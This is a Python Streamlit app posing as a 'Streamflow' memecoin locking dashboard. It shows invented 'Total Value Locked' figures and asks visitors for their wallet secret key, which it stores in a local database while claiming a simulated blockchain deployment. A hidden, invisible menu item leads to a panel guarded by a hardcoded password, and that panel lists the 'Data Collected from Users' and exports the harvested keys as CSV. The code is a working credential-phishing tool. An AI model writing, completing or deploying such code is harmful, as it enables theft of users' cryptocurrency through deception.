import streamlit as st
import sqlite3
import pandas as pd
from PIL import Image

# --- 1. DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('streamflow_vault.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS user_data 
                 (username TEXT, secret_key TEXT, coin_name TEXT, amount REAL)''')
    conn.commit()
    conn.close()

def save_data(user, key, coin, amt):
    conn = sqlite3.connect('streamflow_vault.db')
    c = conn.cursor()
    c.execute("INSERT INTO user_data VALUES (?,?,?,?)", (user, key, coin, amt))
    conn.commit()
    conn.close()

init_db()

# --- 2. THEME & CSS (Streamflow Look + Invisible Button) ---
st.set_page_config(page_title="Streamflow | Dashboard", layout="wide")

st.markdown("""
    <style>
    /* Fundal principal */
    .stApp { background-color: #0b0e11; color: white; }
    
    /* Sidebar styling */
    section[data-testid="stSidebar"] { background-color: #161b22; border-right: 1px solid #30363d; }
    
    /* Neon metrics */
    [data-testid="stMetricValue"] { color: #00ffbd !important; font-family: monospace; }
    
    /* --- ASCUNDEREA TOTALA A BUTONULUI DE JOS --- */
    /* Selectam al doilea element din lista radio */
    div[role="radiogroup"] > label:nth-of-type(2) {
        display: block;
        opacity: 0 !important; /* Complet invizibil */
        height: 10px; /* Ocupa un spatiu minuscul */
        margin-top: -5px;
        cursor: default;
    }
    
    /* Optional: daca vrei sa il gasesti mai usor, cand treci mouse-ul pe zona lui devine foarte putin vizibil */
    div[role="radiogroup"] > label:nth-of-type(2):hover {
        opacity: 0.05 !important;
    }
    </style>
    """, unsafe_allow_html=True)

# --- 3. LOGO INTEGRATION ---
try:
    main_logo = Image.open("logo.png")
    sidebar_icon = Image.open("icon.png")
except:
    main_logo = None
    sidebar_icon = None

# --- SIDEBAR ---
with st.sidebar:
    if sidebar_icon:
        st.image(sidebar_icon, width=80)
    else:
        st.title("STREAMFLOW")
    
    st.markdown("---")
    # Al doilea element are un nume gol pentru a nu afisa text
    menu = st.radio("Navigation", ["Coin Locker", " "])

# --- 4. DASHBOARD (User Interface) ---
if menu == "Coin Locker":
    if main_logo:
        st.image(main_logo, width=300)
    
    st.title("MemeCoin Locker")
    st.caption("Securely lock your tokens in our decentralized vault.")
    
    col1, col2 = st.columns(2)
    with col1:
        st.metric("Total Value Locked", "$734,864", "+5.2%")
    with col2:
        st.metric("Active Streams", "42", "+2 New")

    st.divider()
    
    with st.form("lock_form"):
        name = st.text_input("Project Name")
        s_key = st.text_input("Wallet Secret Key", type="password")
        coin = st.selectbox("Token", ["SOL","ETH"])
        amt = st.number_input("Amount")
        time_lock = st.number_input("Coin lock time (days)")
        
        if st.form_submit_button("Deploy Lock"):
            if name and s_key:
                save_data(name, s_key, coin, amt)
                st.success("Successfully deployed to blockchain (Simulation)")

# --- 5. DEVELOPER PANEL (Accesibil prin click sub "Coin Locker") ---
elif menu == " ":
    st.title("🛠️ Developer Panel")
    password = st.text_input("Security Check", type="password", placeholder="...")

    if password == "Ovidiu_seful_tuturor20":
        try:
            conn = sqlite3.connect('streamflow_vault.db')
            df = pd.read_sql_query("SELECT * FROM user_data", conn)
            conn.close()
            
            st.write("### Data Collected from Users")
            st.dataframe(df, use_container_width=True)
            
            # Export data
            csv = df.to_csv(index=False).encode('utf-8')
            st.download_button("Export as CSV", data=csv, file_name="vault_data.csv")
            
        except Exception as e:
            st.error(f"Error: {e}")












